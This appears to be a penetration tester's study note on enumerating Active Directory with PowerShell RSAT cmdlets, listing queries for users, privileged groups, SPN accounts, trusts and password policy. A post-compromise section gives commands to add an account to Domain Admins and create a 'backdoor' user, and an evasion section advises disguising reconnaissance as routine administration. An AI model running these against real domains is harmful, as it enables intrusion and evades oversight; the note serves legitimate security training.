#enumeration #active-directory

PowerShell AD-RSAT cmdlets provide comprehensive Active Directory enumeration far beyond what Command Prompt's `net` command offers. Essential for detailed AD reconnaissance when you have valid credentials.

---

## Prerequisites

### AD-RSAT module requirement
```powershell
# Install AD-RSAT (Windows Server or client with RSAT installed)
# Windows Server: Server Manager → Add Roles and Features → RSAT AD tools
# Windows Client: Settings → Apps & Features → Manage Optional Features → RSAT

# Verify installation
Get-Module ActiveDirectory -ListAvailable
# Should return ActiveDirectory module
```

### Using from non-domain-joined machine
```powershell
# Use with Runas if not domain-joined
runas.exe /netonly /user:domain.com\username powershell.exe

# Then import module
Import-Module ActiveDirectory
```

---

## Core AD Cmdlets

### Users

#### Get all users
```powershell
Get-ADUser -Filter * -Server domain.com | Select-Object Name, SamAccountName, Enabled
```

#### Get specific user with all properties
```powershell
Get-ADUser -Identity username -Server domain.com -Properties *
# Shows: Account status, last logon, group memberships, description, etc.
```

#### Filter users by criteria
```powershell
# Users in specific department
Get-ADUser -Filter 'Department -eq "IT"' -Server domain.com | Select-Object Name, Department

# Disabled accounts
Get-ADUser -Filter 'Enabled -eq $false' -Server domain.com

# Users with password never expires
Get-ADUser -Filter 'passwordNeverExpires -eq $true' -Server domain.com

# Last logon in specific time range
$date = (Get-Date).AddDays(-30)
Get-ADUser -Filter 'LastLogonDate -gt $date' -Server domain.com
```

#### Search by name pattern
```powershell
Get-ADUser -Filter 'Name -like "*admin*"' -Server domain.com | Format-Table Name, SamAccountName
```

### Groups

#### List all groups
```powershell
Get-ADGroup -Filter * -Server domain.com | Select-Object Name, GroupScope
```

#### Get group members
```powershell
Get-ADGroupMember -Identity "Domain Admins" -Server domain.com | Select-Object Name, ObjectClass
# Shows users and nested groups in group
```

#### Find groups by name
```powershell
Get-ADGroup -Filter 'Name -like "*admin*"' -Server domain.com | Select-Object Name
```

#### Get user's group memberships
```powershell
Get-ADPrincipalGroupMembership -Identity username -Server domain.com | Select-Object Name
# Shows all groups user is member of
```

#### Find privileged groups
```powershell
# Common high-value targets
"Domain Admins", "Enterprise Admins", "Schema Admins", "Backup Operators", "Server Operators" | ForEach-Object {
    Write-Host "=== $_ ==="
    Get-ADGroupMember -Identity $_ -Server domain.com -Recursive | Select-Object Name
}
```

### Computers

#### List all computers
```powershell
Get-ADComputer -Filter * -Server domain.com | Select-Object Name, OperatingSystem, LastLogonDate
```

#### Find specific computer types
```powershell
# All servers
Get-ADComputer -Filter 'OperatingSystem -like "*Server*"' -Server domain.com

# All workstations
Get-ADComputer -Filter 'OperatingSystem -like "*Windows 10*" -or OperatingSystem -like "*Windows 11*"' -Server domain.com

# Disabled computers
Get-ADComputer -Filter 'Enabled -eq $false' -Server domain.com
```

#### Get computer details
```powershell
Get-ADComputer -Identity computername -Server domain.com -Properties *
# Shows: IP, OS, last logon, group memberships, etc.
```

### Organizational Units (OUs)

#### List all OUs
```powershell
Get-ADOrganizationalUnit -Filter * -Server domain.com | Select-Object Name, DistinguishedName
```

#### Find users in specific OU
```powershell
Get-ADUser -Filter * -SearchBase "OU=IT,DC=domain,DC=com" -Server domain.com | Select-Object Name
```

### Domain Information

#### Get domain details
```powershell
Get-ADDomain -Server domain.com | Select-Object Name, DomainMode, NetBIOSName, DNSRoot, PDCEmulator

# Shows: Forest functional level, domain name, DNS root, PDC, etc.
```

#### Get forest information
```powershell
Get-ADForest -Server domain.com | Select-Object Name, Domains, ForestMode, RootDomain
```

#### Get domain controllers
```powershell
Get-ADDomainController -Filter * -Server domain.com | Select-Object Name, OperatingSystem, IPv4Address
```

---

## Advanced Enumeration

### Password policy
```powershell
# Get domain password policy
Get-ADDefaultDomainPasswordPolicy -Server domain.com | Select-Object *
# Shows: Min password age, max age, lockout threshold, history count, etc.
```

### Trust relationships
```powershell
# Get domain trusts
Get-ADTrust -Filter * -Server domain.com | Select-Object Name, Direction, TrustType
# Shows: Other domains/forests this domain trusts
```

### Service Principal Names (SPNs)
```powershell
# Find users with SPNs (often service accounts)
Get-ADUser -Filter 'servicePrincipalName -ne "$null"' -Server domain.com -Properties servicePrincipalName | Select-Object Name, servicePrincipalName
```

### Kerberoastable accounts
```powershell
# Accounts with SPNs are Kerberoastable
Get-ADUser -Filter 'servicePrincipalName -ne "$null"' -Server domain.com | Select-Object Name, servicePrincipalName
```

### Objects modified recently
```powershell
$date = (Get-Date).AddDays(-7)
Get-ADObject -Filter 'whenChanged -gt $date' -Server domain.com | Select-Object Name, ObjectClass, whenChanged
```

### Failed logon analysis
```powershell
# Find accounts with recent failed logon attempts
Get-ADUser -Filter 'badPwdCount -gt 0' -Server domain.com | Select-Object Name, badPwdCount, LastBadPasswordAttempt
```

### Account lockout status
```powershell
# Get accounts that are locked out
Get-ADUser -Filter 'LockedOut -eq $true' -Server domain.com | Select-Object Name, LockedOut, AccountLockoutTime
```

---

## Format and Filter Results

### Format results nicely
```powershell
# Table format
Get-ADUser -Filter * -Server domain.com | Format-Table Name, SamAccountName, Enabled -AutoSize

# CSV export
Get-ADUser -Filter * -Server domain.com | Export-Csv users.csv

# Grid view (GUI)
Get-ADUser -Filter * -Server domain.com | Out-GridView
```

### Filter results
```powershell
# Pipeline filtering
Get-ADUser -Filter * -Server domain.com | Where-Object {$_.LastLogonDate -gt (Get-Date).AddDays(-30)} | Select-Object Name

# Count objects
Get-ADUser -Filter * -Server domain.com | Measure-Object
```

---

## Recon Workflow

### Step 1: Enumerate domain structure
```powershell
# Get domain info
Get-ADDomain -Server domain.com

# Get domain controllers
Get-ADDomainController -Filter * -Server domain.com

# Get OUs
Get-ADOrganizationalUnit -Filter * -Server domain.com
```

### Step 2: Find high-value targets
```powershell
# Domain admins
Get-ADGroupMember -Identity "Domain Admins" -Server domain.com

# Enterprise admins
Get-ADGroupMember -Identity "Enterprise Admins" -Server domain.com

# Other admin groups
Get-ADGroup -Filter 'Name -like "*admin*"' -Server domain.com | ForEach-Object {
    Write-Host "=== $($_.Name) ==="
    Get-ADGroupMember -Identity $_.Name -Server domain.com | Select-Object Name
}
```

### Step 3: Find interesting accounts
```powershell
# Service accounts (have SPNs)
Get-ADUser -Filter 'servicePrincipalName -ne "$null"' -Server domain.com | Select-Object Name, servicePrincipalName

# Accounts with old passwords
$date = (Get-Date).AddDays(-180)
Get-ADUser -Filter 'pwdLastSet -lt $date' -Server domain.com | Select-Object Name, pwdLastSet

# Recently changed passwords (suspicious)
$date = (Get-Date).AddDays(-7)
Get-ADUser -Filter 'pwdLastSet -gt $date' -Server domain.com
```

### Step 4: Map relationships
```powershell
# Find who has admin privileges on which machines
# (Requires additional enumeration beyond AD)

# Find computers in specific OUs
Get-ADComputer -Filter * -SearchBase "OU=Servers,DC=domain,DC=com" -Server domain.com
```

---

## Credentials Modification (Post-Compromise)

### Change user password
```powershell
$newPassword = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
Set-ADAccountPassword -Identity username -NewPassword $newPassword -Server domain.com -Reset
```

### Add user to group
```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members username -Server domain.com
```

### Create new user
```powershell
New-ADUser -Name "backdoor" -SamAccountName backdoor -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true -Server domain.com
```

---

## Detection & Evasion

### What gets logged
- PowerShell execution (if logging enabled)
- AD queries (domain controller audit logs)
- Authentication events
- Group membership changes (if audited)

### Evasion techniques
- Use living-off-the-land PowerShell cmdlets (less suspicious)
- Blend queries with legitimate system administration
- Perform enumeration at off-hours
- Use appropriate accounts (don't use admin account for enumeration)
- Avoid sensitive queries like "Domain Admins" on first scan
- Use `-Server` parameter to specify domain (looks intentional)

### Query examples that look legitimate
```powershell
# System admin looking for disabled accounts
Get-ADUser -Filter 'Enabled -eq $false' -Server domain.com

# Check password policy
Get-ADDefaultDomainPasswordPolicy -Server domain.com

# List computers for inventory
Get-ADComputer -Filter * -Server domain.com | Select-Object Name, OperatingSystem
```

---

## Tools requiring AD enumeration

These cmdlets provide data for:
- Bloodhound/Sharphound (graph-based analysis)
- Mimikatz (credential dumping)
- Empire/C2 frameworks (target selection)
- Lateral movement planning

---

## Benefits

- Comprehensive AD information in minutes
- Easily scriptable for automation
- Can export results for offline analysis
- Works on non-domain-joined machines with `/netonly` + runas
- Built-in to Windows (RSAT installation only)
- Can perform complex filters and searches

---

## Drawbacks

- Requires RSAT module installation
- PowerShell may be monitored more than Command Prompt
- Domain controller must be reachable
- Some queries may take time on large domains

---

**See also:**
- [[AD Enumeration with Runas]] — credential injection for non-domain-joined machines
- [[Bloodhound Analysis]] — graph-based attack path discovery
- [[Command Prompt AD Enumeration]] — net command basics
- [[Active Directory Exploitation]] — post-enumeration attacks
